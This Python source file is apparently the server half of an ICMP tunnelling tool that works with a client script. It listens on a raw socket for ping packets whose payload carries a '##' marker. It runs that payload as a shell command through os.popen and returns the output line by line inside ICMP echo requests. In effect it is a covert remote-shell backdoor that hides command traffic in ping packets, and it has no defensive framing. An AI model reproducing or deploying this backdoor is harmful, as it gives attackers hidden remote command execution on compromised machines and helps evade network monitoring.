import socket 
import struct 
import time
import re, os, sys
import fcntl
# Set up some useful constants 
ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY = 0
ICMP_CODE = socket.getprotobyname('icmp')

'''
Listen for ICMP connections (works together with client_icmp.py )
@author: Dario Guarracino

'''
def get_ip_address(interface):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,
        struct.pack('256s', interface[:15])
    )[20:24])

def checksum(source_string):
    
    sum = 0
    countTo = (len(source_string)/2)*2
    count = 0
    while count<countTo:
        thisVal = ord(source_string[count + 1])*256 + ord(source_string[count])
        sum = sum + thisVal
        sum = sum & 0xffffffff 
        count = count + 2
 
    if countTo<len(source_string):
        sum = sum + ord(source_string[len(source_string) - 1])
        sum = sum & 0xffffffff 
 
    sum = (sum >> 16)  +  (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    # Swap bytes. 
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def send_icmp(ip, data, identifier):
    icmp = socket.getprotobyname('icmp')

    dest_address = socket.gethostbyname(ip)

    _socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
    payload = "@@"+data

    header_checksum = 0
    # Set checksum bytes to 0 before doing the checksum
    # b = signed char (1byte)
    # H = unsigned short (2byte)
    # h = short (2 byte) 
    header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, header_checksum, identifier, 1) #type,code,checksum,identifier,sequence

    header_checksum = checksum(header + payload)
    # Calculate the real checksum
    header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, socket.htons(header_checksum), identifier, 1 ) #type,code,checksum,identifier,sequence

    packet = header + payload

    _socket.sendto(packet, (dest_address, 0));
    _socket.close()


def receive_icmp(ifaddr):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    # s.bind(('192.168.1.64', 0))
 
    s.bind(('', 0))
    print("Started listening...")
    i = 1 # used to elaborate just one icmp message. The interface sees both the ECHO REQUEST and ECHO REPLY
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    #fcntl.ioctl(s, FLAGS.SIOCGIFFLAGS, )
    #s.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) only on windows

    while True:
        data = s.recvfrom(65565)
        d1 = str(data[0])
        i = i+1
        if i%2 == 0:
            if i >= 2000: 
                i = 0
            payload = re.search('##(.*)', d1)
            if (payload is not None): 
                command = payload.group(0)[2:]
                ip,_ = data[1] #extract header
                ip_str = str(ip)
                if (ip_str == ifaddr ):
                    continue; # ignore own packets
                print("Source IP is " + ip_str, i )
            
                output = execute(command)
                for line in output.readlines():
                    send_icmp(ip_str, line, os.getpid() & 0xFFFF)
       
    # s.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
    #fcntl.ioctl(s, socket.SIO_RCVALL, socket.RCVALL_OFF)

if (len(sys.argv) < 2):
    print("Please specify a network interface")
    exit(1)


def execute(cmd):

    output = os.popen(cmd)
    return output

if __name__ == '__main__':
    interface = sys.argv[1]
    ifaddr = get_ip_address(interface)
    receive_icmp(ifaddr)
